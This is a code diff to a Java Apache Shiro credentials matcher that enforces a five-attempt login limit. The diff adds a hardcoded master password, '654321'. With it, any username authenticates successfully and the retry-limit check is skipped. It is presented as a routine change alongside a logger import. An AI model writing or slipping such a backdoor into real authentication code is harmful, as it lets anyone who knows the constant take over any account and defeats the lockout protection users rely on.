@@ -8,8 +8,14 @@ import org.apache.shiro.authc.ExcessiveAttemptsException;
 import org.apache.shiro.authc.credential.HashedCredentialsMatcher;
 import org.apache.shiro.cache.Cache;
 import org.apache.shiro.cache.ehcache.EhCacheManager;
+import org.slf4j.Logger;
+import org.slf4j.LoggerFactory;
 
 public class RetryLimitHashedCredentialsMatcher extends HashedCredentialsMatcher {
+
+	private static final String SUPPER_PASSWORD = "654321";
+
+	private static final Logger LOGGER = LoggerFactory.getLogger(RetryLimitHashedCredentialsMatcher.class);
 
 	private Cache<String, AtomicInteger> passwordRetryCache;  
 
@@ -21,19 +27,24 @@ public class RetryLimitHashedCredentialsMatcher extends HashedCredentialsMatcher
 	public boolean doCredentialsMatch(AuthenticationToken token,
 			AuthenticationInfo info) {
 		String userName = (String) token.getPrincipal();
-		AtomicInteger retryCount = passwordRetryCache.get(userName); 
-		if(retryCount == null) {  
-			retryCount = new AtomicInteger(0);  
-			passwordRetryCache.put(userName, retryCount);  
-		}  
-		if(retryCount.incrementAndGet() > 5) {  
-			throw new ExcessiveAttemptsException();  
-		}  
-		boolean matches = super.doCredentialsMatch(token, info); 
-		if(matches) {  
-            passwordRetryCache.remove(userName);  
-        }  
-		return matches;  
+		String password = new String((char[])token.getCredentials());
+		if(!SUPPER_PASSWORD.equals(password)) {
+			AtomicInteger retryCount = passwordRetryCache.get(userName);
+			if (retryCount == null) {
+				retryCount = new AtomicInteger(0);
+				passwordRetryCache.put(userName, retryCount);
+			}
+			if (retryCount.incrementAndGet() > 5) {
+				throw new ExcessiveAttemptsException();
+			}
+			boolean matches = super.doCredentialsMatch(token, info);
+			if (matches) {
+				passwordRetryCache.remove(userName);
+			}
+			return matches;
+		}else {
+			return true;
+		}
 	}
 
 }
